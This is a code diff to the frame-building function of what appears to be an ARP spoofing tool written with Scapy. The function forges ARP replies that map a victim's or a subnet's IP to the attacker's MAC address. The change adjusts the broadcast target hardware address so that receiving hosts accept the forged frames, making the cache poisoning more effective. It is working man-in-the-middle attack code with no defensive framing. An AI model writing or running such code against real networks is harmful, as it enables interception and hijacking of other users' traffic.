@@ -88,16 +88,20 @@ def _spoof_frame(
     """Build one forged ARP reply frame.
 
     The frame is always an ARP reply (``op=2``) claiming that ``spoofed_ip`` is
-    at ``spoofer_mac``. The L2 destination and ARP ``hwdst`` are both ``dst_mac``
-    (unicast or broadcast, chosen by the caller), and ``pdst`` is the ARP
-    packet's target IP - a specific victim IP in ``reply`` mode, or a subnet's
-    directed broadcast address in ``gratuitous`` mode.
+    at ``spoofer_mac``. The L2 destination is ``dst_mac`` (unicast or broadcast,
+    chosen by the caller), and ``pdst`` is the ARP packet's target IP - a
+    specific victim IP in ``reply`` mode, or a subnet's directed broadcast
+    address in ``gratuitous`` mode. When broadcasting, ARP ``hwdst`` is set to
+    all zeros per RFC 826; otherwise it equals the L2 destination.
     """
+    # When broadcasting (dst_mac is ff:ff:ff:ff:ff:ff), ARP hwdst must be
+    # all zeros for the receiving kernel to accept it as valid.
+    arp_hwdst = "00:00:00:00:00:00" if dst_mac == _BROADCAST_MAC else dst_mac
     return Ether(src=spoofer_mac, dst=dst_mac) / ARP(
         op=2,  # reply
         hwsrc=spoofer_mac,
         psrc=spoofed_ip,
-        hwdst=dst_mac,
+        hwdst=arp_hwdst,
         pdst=pdst,
     )
 
